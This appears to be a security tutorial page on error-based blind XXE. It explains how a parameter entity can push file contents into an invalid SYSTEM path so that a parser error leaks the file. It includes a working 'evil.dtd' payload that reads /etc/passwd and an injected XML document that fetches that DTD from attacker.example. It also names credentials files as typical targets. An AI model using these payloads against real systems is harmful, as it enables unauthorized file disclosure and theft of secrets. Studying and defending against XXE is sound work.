---
title: "Error-based blind XXE data recovery"
description: "A parameter entity that feeds file contents into an invalid SYSTEM path forces a parse error whose message leaks the file."
keywords:
  - error-based XXE
  - blind XXE
  - parameter entity
  - parse error leak
  - file disclosure
---

# Error messages

When the parser resolves entities but nothing parsed is reflected, and outbound network access is blocked so out-of-band exfiltration cannot work, the parser's own **error reporting** becomes the channel. Many XML parsers include the offending value in a fatal-error string. If that error text reaches the client, in a stack trace, a JSON error field, or a logged response, the attacker can arrange for the error to contain the contents of a target file.

## The technique

The payload reads the file into a parameter entity, then uses it to build a second entity that references a path which cannot exist. The file contents become part of that path, and the parser's "resource not found" error echoes the whole thing back.

Host this as the external DTD `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The injected document pulls it in:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
```

The sequence inside the DTD matters. `%file;` captures the file contents. `%eval;` is a declaration whose body, after `%file;` expands, defines `%error;` as a SYSTEM entity pointing at `file:///nonexistent/` followed by the file contents. `&#x25;` encodes the `%` so the inner parameter-entity declaration is formed at the right moment rather than consumed too early. When `%error;` is resolved, the parser tries to open a path such as `file:///nonexistent/root:x:0:0:root:/root:/bin/bash...` and fails, producing an error like:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...
```

The file's first line (and sometimes more, depending on how the parser truncates the path) is now sitting inside the exception message. Each request leaks the portion of the file that fits into the reported path.

## Local-only variant

The external DTD can be avoided when any outbound access, even a single HTTP fetch of `evil.dtd`, is impossible. The same declaration structure is placed in the internal subset where the parser permits it, or combined with an on-disk DTD as described in the local-DTD technique. The error-message channel itself does not need the network at all; it only needs the parser to surface the error. That makes it the fallback when both reflection and out-of-band exfiltration are unavailable but verbose errors leak to the client.

## Practical notes

The leak is partial and path-shaped: newlines and characters illegal in a filename often truncate the captured content, so this recovers short files or line-by-line fragments rather than whole binaries. Reading `/etc/hostname`, `/etc/passwd`, short config files, and the first lines of credentials files is the typical use. Where the full file is needed and any egress exists, prefer out-of-band exfiltration with `php://filter` base64 encoding instead.

## References

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
